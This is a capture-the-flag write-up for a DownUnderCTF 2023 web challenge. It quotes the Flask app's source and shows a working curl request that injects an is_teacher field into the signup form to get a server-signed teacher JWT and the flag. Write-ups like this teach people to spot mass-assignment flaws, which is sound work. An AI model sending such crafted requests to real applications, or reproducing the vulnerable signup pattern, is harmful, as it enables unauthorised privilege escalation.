# DownUnderCTF 2023

## grades_grades_grades

> Sign up and see those grades :D! How well did you do this year's subject?
>
>  Author: donfran
>
> [`grades_grades_grades.tar.gz`](grades_grades_grades.tar.gz)

Tags: _web_

## Solution
For this challenge we get the source code for a web application where students can view their grades. Inspecting the code a bit we can find some interesting routes. The target seems to be `grades_flag` which requires a teacher role.

```python
@api.route('/grades_flag', methods=('GET',))
@requires_teacher
def flag():
    return render_template('flag.html', flag="FAKE{real_flag_is_on_the_server}", is_auth=True, is_teacher_role=True)
```

Then there is a `signup` route which is used to create a new account and an associated `jwt`. 

```python
@api.route('/signup', methods=('POST', 'GET'))
def signup():

    # make sure user isn't authenticated
    if is_teacher_role():
        return render_template('public.html', is_auth=True, is_teacher_role=True)
    elif is_authenticated():
        return render_template('public.html', is_auth=True)

    # get form data
    if request.method == 'POST':
        jwt_data = request.form.to_dict()
        jwt_cookie = current_app.auth.create_token(jwt_data)
        if is_teacher_role():
            response = make_response(redirect(url_for('api.index', is_auth=True, is_teacher_role=True)))
        else:
            response = make_response(redirect(url_for('api.index', is_auth=True)))

        response.set_cookie('auth_token', jwt_cookie, httponly=True)
        return response

    return render_template('signup.html')
```

The token itself is signed with a secret which we dont have. So cracking the secret could be one way but the challenge was marked `easy` therefore another way might be exist. 

```python
SECRET_KEY = secrets.token_hex(32)

def create_token(data):
    token = jwt.encode(data, SECRET_KEY, algorithm='HS256')
    return token
```

Lets see how a teacher roll is determined. So teachers have a `is_teacher` field. If we knew the secret, we could generate a token for a teacher roll by just providing `is_teacher=True`. 

```python
def is_teacher_role():
    # if user isn't authed at all
    if 'auth_token' not in request.cookies:
        return False
    token = request.cookies.get('auth_token')
    try:
        data = decode_token(token)
        if data.get('is_teacher', False):
            return True
    except jwt.DecodeError:
        return False
    return False
```

In this case, hovever, we can just let the server create a teacher roll. The `signup` route just takes our post parameters dictionary as a whole, so we can pass in whatever we like.

```bash
$ curl -X POST https://web-grades-grades-grades-c4627b227382.2023.ductf.dev/signup -H "Content-Type: application/x-www-form-urlencoded" --data-raw 'stu_num=test&stu_email=test%40test.de&password=test&is_teacher=True'
...
< set-cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoidGVzdCIsInN0dV9lbWFpbCI6InRlc3RAdGVzdC5kZSIsInBhc3N3b3JkIjoidGVzdCIsImlzX3RlYWNoZXIiOiJUcnVlIn0.SMS66T5aPMseEaEHEEbNJP4NkBkwZQYKb2EgZpBmyHk; HttpOnly; Path=/
< content-length: 215
<
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?is_auth=True">/?is_auth=True</a>. If not, click the link.
```

And there we have a signed token with teacher roll. Setting the token as `auth_token` and refreshing the page we are `teacher` now and get the flag.

Flag `DUCTF{Y0u_Kn0W_M4Ss_A5s1GnM3Nt_c890ne89c3}`